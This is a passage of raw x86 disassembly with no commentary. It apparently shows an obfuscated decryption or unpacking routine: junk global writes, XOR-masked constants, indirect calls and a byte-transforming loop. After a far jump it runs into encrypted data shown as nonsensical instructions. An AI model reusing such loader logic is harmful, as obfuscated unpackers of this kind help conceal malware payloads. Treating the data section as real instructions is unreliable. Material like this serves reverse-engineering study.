  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42aa33
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292cb
  403aec:	mov    eax,ds:0x429757
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42aa37
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	pop    ebx
  403e71:	dec    edx
  403e72:	jge    0x403e90
  403e74:	inc    edi
  403e75:	pusha  
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0xffffffd4
  403e7d:	pusha  
  403e7e:	add    cl,BYTE PTR [ebp+0x532060fe]
  403e84:	fadd   QWORD PTR [esi+ecx*8+0x53bdba8a]
  403e8b:	pusha  
  403e8c:	ret    0xda16
  403e8f:	mov    bh,BYTE PTR [edx+edx*4]
  403e92:	and    ebx,edi
  403e94:	int    0x87
  403e96:	pop    esi
  403e97:	stos   BYTE PTR es:[edi],al
  403e98:	pop    ss
  403e99:	fwait
  403e9a:	adc    BYTE PTR [ecx],ch
  403e9c:	mov    ebp,0xdefe57c6
  403ea1:	inc    ebp
  403ea2:	pop    es
  403ea3:	cmp    DWORD PTR [eax],ecx
  403ea5:	mov    ebp,0xe1b5e99e
  403eaa:	test   BYTE PTR [esi+0x7],al
  403ead:	pop    eax
  403eae:	sti    
  403eaf:	js     0x403e87
  403eb1:	ja     0x403e51
  403eb3:	jne    0x403f2f
  403eb5:	jb     0x403e4b
  403eb7:	jo     0x403ed4
  403eb9:	add    esi,DWORD PTR [ebx+0xbe73b4e]
  403ebf:	mov    dl,0xe1
  403ec1:	stos   BYTE PTR es:[edi],al
  403ec2:	aam    0x1
  403ec4:	sti    
  403ec5:	rdmsr  
  403ec7:	fisttp WORD PTR [esi-0x53]
  403eca:	sub    ch,cl
  403ecc:	ins    BYTE PTR es:[edi],dx
  403ecd:	cld    
  403ece:	xor    esp,edx
  403ed0:	and    DWORD PTR [esi],ecx
  403ed2:	pop    eax
  403ed3:	call   DWORD PTR [ebx-0x1b]
  403ed6:	fnstsw WORD PTR [eax+0x43]
  403ed9:	mov    ch,0x98
  403edb:	lds    ebx,FWORD PTR [esi+0x59]
  403ede:	lea    esp,[ebx+eax*4+0x10]
  403ee2:	sbb    esp,ecx
  403ee4:	gs inc ecx
  403ee6:	loop   0x403ef7
  403ee8:	mov    ch,0x42
  403eea:	ret    0x60a6
  403eed:	loopne 0x403e75
  403eef:	ins    BYTE PTR es:[edi],dx
  403ef0:	(bad)  
  403ef1:	not    BYTE PTR [ecx-0x950fb12]
  403ef7:	or     esi,DWORD PTR [eax+ecx*1+0x16c9c59d]
  403efe:	jecxz  0x403f7f
  403f00:	aaa    
  403f01:	clc    
  403f02:	ins    DWORD PTR es:[edi],dx
  403f03:	mov    edx,0x625fc100
  403f08:	cmp    ah,al
  403f0a:	inc    esp
  403f0b:	cmc    
  403f0c:	inc    ebp
  403f0d:	pop    ss
  403f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f0f:	fstsw  WORD PTR [edi+0x46]
  403f13:	push   0xffffff8b
  403f15:	loope  0x403f3c
  403f17:	mov    ch,0xe6
  403f19:	outs   dx,BYTE PTR ds:[esi]
  403f1a:	push   0xc99c123b
  403f1f:	cli    
  403f20:	mov    dh,BYTE PTR [ecx+0x14e6df97]
  403f26:	ja     0x403f91
  403f28:	outs   dx,BYTE PTR cs:[esi]
  403f2a:	aam    0xd9
  403f2c:	jle    0x403f8c
  403f2e:	pop    ds
  403f2f:	xchg   edi,eax
  403f30:	inc    ebx
  403f31:	std    
  403f32:	xlat   BYTE PTR ds:[ebx]
  403f33:	loopne 0x403fa6
  403f35:	push   ecx
  403f36:	dec    eax
  403f37:	push   0x12
  403f39:	lea    ebp,[esi+0x7ba8ff05]
  403f3f:	rcl    BYTE PTR [ecx+0x7d],1
  403f42:	xchg   BYTE PTR [esi],dl
  403f44:	je     0x403fa4
  403f46:	jnp    0x403f98
  403f48:	xlat   BYTE PTR ds:[ebx]
  403f49:	bound  ebx,QWORD PTR [ebx]
  403f4b:	mov    ah,0xbb
  403f4d:	shl    esi,1
  403f4f:	bound  ebp,QWORD PTR ds:[edx]
  403f52:	mov    edi,0xddefbfc3
  403f57:	cmp    bl,BYTE PTR [esi+0x26]
  403f5a:	and    BYTE PTR [ebx-0x2579bfc],bl
  403f60:	or     eax,0xf7ac9a0
  403f65:	pop    ecx
  403f66:	or     DWORD PTR [ebp+0x23],0x13
  403f6a:	add    BYTE PTR [edi-0x1f12d7d9],ah
  403f70:	out    dx,al
  403f71:	into   
  403f72:	dec    ebx
  403f73:	and    esp,DWORD PTR [ebp-0x63]
  403f76:	cmp    bl,ch
  403f78:	retf   
  403f79:	sbb    DWORD PTR [ecx],0x77
  403f7c:	bound  edi,QWORD PTR [ebp*2+0x4eba06cd]
  403f83:	fadd   DWORD PTR [ebp-0x601ce5cd]
  403f89:	xor    dh,BYTE PTR ds:0x9adf1cf2
  403f8f:	test   BYTE PTR [ebx],0x88
  403f92:	and    eax,0x3d93c257
  403f97:	adc    al,0xb3
  403f99:	fs sub eax,0x72a3a28b
  403f9f:	xor    BYTE PTR [ebx],ah
  403fa1:	dec    edx
  403fa2:	scas   eax,DWORD PTR es:[edi]
  403fa3:	push   ebx
  403fa4:	cmp    DWORD PTR [edx+0x7b19c53e],esi
  403faa:	ja     0x403faa
  403fac:	repz in al,dx
  403fae:	mov    es,WORD PTR [edx+ebp*1-0x14]
  403fb2:	aas    
  403fb3:	out    dx,eax
  403fb4:	test   DWORD PTR [edx+0x681be0d2],ebp
  403fba:	lods   eax,DWORD PTR ds:[esi]
  403fbb:	outs   dx,DWORD PTR ds:[esi]
  403fbc:	sbb    al,BYTE PTR [esi-0x20]
  403fbf:	pusha  
  403fc0:	or     esi,DWORD PTR [ebp-0x143c2aa7]
  403fc6:	(bad)  
  403fc7:	mov    ah,0xb1
  403fc9:	jle    0x404025
  403fcb:	(bad)  
  403fcc:	icebp  
  403fcd:	mov    ch,0x3
  403fcf:	sbb    al,0xf5
  403fd1:	pop    edi
  403fd2:	mov    ecx,0xa4ed85bb
  403fd7:	adc    al,0x73
  403fd9:	cdq    
  403fda:	sbb    DWORD PTR [edx],esi
  403fdc:	mov    eax,0x24113554
  403fe1:	call   0xb2a366d0
  403fe6:	add    eax,0xdbbd1ba7
  403feb:	mov    ds:0x345707e,eax
  403ff0:	dec    esi
  403ff1:	jmp    0x40400e
  403ff3:	xchg   esp,eax
  403ff4:	and    DWORD PTR cs:[edi],eax
  403ff7:	popf   
  403ff8:	jae    0x403fb9
  403ffa:	out    dx,al
  403ffb:	mov    edx,0xa6a9a514
  404000:	mov    ah,0xe8
  404002:	sbb    BYTE PTR [eax],bh
  404004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404005:	std    
  404006:	xor    al,BYTE PTR [edi]
  404008:	fdivr  DWORD PTR [ecx+0x7f8a8cb3]
  40400e:	mov    al,0x3e
  404010:	fnstenv ds:0x8a3278b0
  404016:	pop    ss
  404017:	mov    eax,ds:0x1f70b8a8
  40401c:	outs   dx,BYTE PTR ds:[esi]
  40401d:	push   esp
  40401e:	(bad)  
  40401f:	mov    bl,0xf8
  404021:	into   
  404022:	sbb    WORD PTR [edi],si
  404025:	add    eax,DWORD PTR [edx]
  404027:	ins    DWORD PTR es:[edi],dx
  404028:	mov    dh,0x82
  40402a:	and    dh,BYTE PTR [eax]
  40402c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40402d:	push   cs
  40402e:	or     esi,edi
  404030:	jne    0x4040ab
  404032:	or     edi,DWORD PTR [ebx+0x5df88cef]
  404038:	test   DWORD PTR [esi-0x492b38fe],esp
  40403e:	or     ch,BYTE PTR [ebx]
  404040:	mov    eax,ds:0x4860fbeb
  404045:	ss fs cdq 
  404048:	imul   esi,DWORD PTR [edi+0x52ccf517],0x10
  40404f:	inc    esp
  404050:	pop    ds
  404051:	xchg   ebx,eax
  404052:	or     dl,BYTE PTR ds:0xd7b48973
  404058:	add    DWORD PTR [ebp+0x527adbf3],ebx
  40405e:	imul   eax,edx,0x784ffb00
  404064:	out    dx,eax
  404065:	popf   
  404066:	sub    al,0x9a
  404068:	(bad)  
  404069:	fwait
  40406a:	lock push edx
  40406c:	sub    edi,DWORD PTR [esi+eax*4-0x62]
  404070:	pop    esi
  404071:	pop    esp
  404072:	mov    ebx,0xdabbfbb
  404077:	loope  0x40402c
  404079:	mov    DWORD PTR [edx-0x5af81e12],eax
  40407f:	ja     0x4040aa
  404081:	adc    al,0x45
  404083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404084:	xchg   ecx,eax
  404085:	sub    al,0x2
  404087:	das    
  404088:	fsubr  QWORD PTR [edx]
  40408a:	cmp    BYTE PTR [eax],dh
  40408c:	pop    ebx
  40408d:	dec    ecx
  40408e:	cld    
  40408f:	rcl    BYTE PTR [ecx+0x3c],1
  404092:	mov    ds:0x96949240,eax
  404097:	push   eax
  404098:	stc    
  404099:	pop    ecx
  40409a:	push   ebx
  40409b:	mov    ebx,0x310c3e14
  4040a0:	pop    edi
  4040a1:	xchg   BYTE PTR [eax+0x75],dh
  4040a4:	and    al,BYTE PTR [edi+edi*2]
  4040a7:	inc    edi
  4040a8:	mov    DWORD PTR [esi],ebp
  4040aa:	retf   0xb68f
  4040ad:	mov    ds:0x88e491d8,eax
  4040b2:	mov    bl,0xa8
  4040b4:	xchg   ecx,eax
  4040b5:	jns    0x40405a
  4040b7:	ret    
  4040b8:	sub    dh,BYTE PTR [esi+eax*1+0x53]
  4040bc:	test   al,0xd7
  4040be:	push   ecx
  4040bf:	jne    0x404075
  4040c1:	dec    ecx
  4040c2:	add    ecx,DWORD PTR [ebx]
  4040c4:	jb     0x40412e
  4040c6:	jmp    0x5d2a:0x4d8a798d
  4040cd:	push   cs
  4040ce:	ret    0x8532
  4040d1:	jmp    0xe388:0xc76c5d78
  4040d8:	mov    esp,0xdbe9699
  4040dd:	sub    DWORD PTR [ebp+0x53],esp
  4040e0:	jns    0x40410c
  4040e2:	fmulp  st(2),st
  4040e4:	sub    DWORD PTR [edi-0x63d7fb2],ebp
  4040ea:	add    eax,0x3c4d72c0
  4040ef:	stos   DWORD PTR es:[edi],eax
  4040f0:	xor    al,0xe0
  4040f2:	scas   eax,DWORD PTR es:[edi]
  4040f3:	mov    bh,0xd9
  4040f5:	mov    bl,0x49
  4040f7:	ss aam 0x55
  4040fa:	call   0x82b8b18
  4040ff:	push   ss
  404100:	lock xor al,0x7f
  404103:	mov    al,BYTE PTR [edi+0x3]
  404106:	cli    
  404107:	xor    eax,0xfd276186
  40410c:	cmp    eax,0x837b09f1
  404111:	pop    esp
  404112:	lock push esp
  404114:	mov    es,WORD PTR [edi]
  404116:	clc    
  404117:	xor    BYTE PTR [ecx],al
  404119:	cs (bad) 
  40411b:	fs ret 
  40411d:	outs   dx,DWORD PTR ds:[esi]
  40411e:	inc    edi
  40411f:	cs mov ch,0x47
  404122:	or     bh,ch
  404124:	loopne 0x4040f2
  404126:	aas    
  404127:	pavgw  mm2,mm2
  40412a:	in     al,dx
  40412b:	les    ebp,FWORD PTR [edx+0x71]
  40412e:	repnz pop edi
  404130:	fs mov ebp,0xefc4eb1e
  404136:	adc    cl,al
  404138:	imul   ebp,DWORD PTR [ecx-0x779c969],0xffffffcc
  40413f:	gs pusha 
  404141:	sbb    eax,0xfc615a0
  404146:	(bad)  
  404147:	adc    BYTE PTR [ecx+0x11],al
  40414a:	pop    esi
  40414b:	inc    esi
  40414c:	add    al,0x13
  40414e:	clc    
  40414f:	aaa    
  404150:	add    BYTE PTR [edx+0x10],ah
  404153:	xor    BYTE PTR [ecx+0x26c5219d],dl
  404159:	out    dx,eax
  40415a:	outs   dx,BYTE PTR ds:[esi]
  40415b:	cvttps2pi mm4,QWORD PTR [esi]
  40415e:	int    0x36
  404160:	jg     0x404173
  404162:	sbb    dh,ch
  404164:	leave  
  404165:	pushf  
  404166:	pop    edx
  404167:	pop    edi
  404168:	stos   DWORD PTR es:[edi],eax
  404169:	rcr    esi,0xb
  40416c:	xchg   ebx,eax
  40416d:	fdivp  st(0),st
  40416f:	and    BYTE PTR [eax+edi*1],dl
  404172:	xor    BYTE PTR [esi-0x2f],bh
  404175:	cmc    
  404176:	ds jns 0x4041f8
  404179:	and    al,0xd0
  40417b:	mov    ds:0x9fcf3816,eax
  404180:	daa    
  404181:	sahf   
  404182:	inc    esi
  404183:	ret    0xbe41
  404186:	scas   al,BYTE PTR es:[edi]
  404187:	pop    es
  404188:	inc    ebx
  404189:	out    0x78,eax
  40418b:	xor    BYTE PTR [edx],0x0
  40418e:	push   bx
  404190:	add    dl,BYTE PTR [edx-0x7bb8d3a1]
  404196:	xor    BYTE PTR [ebx-0x39],0x98
  40419a:	fwait
  40419b:	aad    0x61
  40419d:	pop    edx
  40419e:	out    0xac,eax
  4041a0:	fbld   TBYTE PTR [eax]
  4041a2:	divps  xmm5,XMMWORD PTR [ecx+ecx*8+0x4f]
  4041a7:	dec    ecx
  4041a8:	mov    ?,WORD PTR [esp+ecx*8-0x791e9378]
  4041af:	mov    esp,0x1ff4c8e
  4041b4:	adc    cl,al
  4041b6:	mov    dl,0x68
  4041b8:	fcom   QWORD PTR [ecx+edi*8-0x73d09f20]
  4041bf:	mov    ds:0x43813eea,al
  4041c4:	dec    ecx
  4041c5:	in     al,dx
  4041c6:	mov    edi,0xdb62dd1c
  4041cb:	push   es
  4041cc:	icebp  
  4041cd:	out    0x28,eax
  4041cf:	add    ecx,DWORD PTR [edi-0x32]
  4041d2:	add    eax,0xdc1ffa34
  4041d7:	loopne 0x404226
  4041d9:	sbb    ebx,ebx
  4041db:	push   esp
  4041dc:	stc    
  4041dd:	repnz mov DWORD PTR [esi],esi
  4041e0:	push   ecx
  4041e1:	mov    eax,0x1bbd2d8b
  4041e6:	clc    
  4041e7:	xor    BYTE PTR ds:0xde143cd3,bl
  4041ed:	retf   
  4041ee:	clc    
  4041ef:	push   0x5
  4041f1:	repnz adc DWORD PTR [edx],eax
  4041f4:	pushf  
  4041f5:	lods   al,BYTE PTR ds:[esi]
  4041f6:	jge    0x404271
  4041f8:	push   ds
  4041f9:	cmp    eax,0xeda7fefa
  4041fe:	(bad)  
  4041ff:	pop    ecx
  404200:	loope  0x404239
  404202:	data16 add ah,0x4d
  404206:	jle    0x404249
  404208:	and    al,0xfb
  40420a:	jnp    0x4041b0
  40420c:	and    DWORD PTR [ebx+eiz*2-0x6d],esp
  404210:	test   bl,bh
  404212:	or     BYTE PTR [edi],ch
  404214:	sbb    eax,0x3b268588
  404219:	imul   DWORD PTR [esi]
  40421b:	lock inc ebx
  40421d:	cli    
  40421e:	sub    ecx,ecx
  404220:	or     eax,0x3c612ecb
  404225:	mov    eax,ds:0xb70fccd6
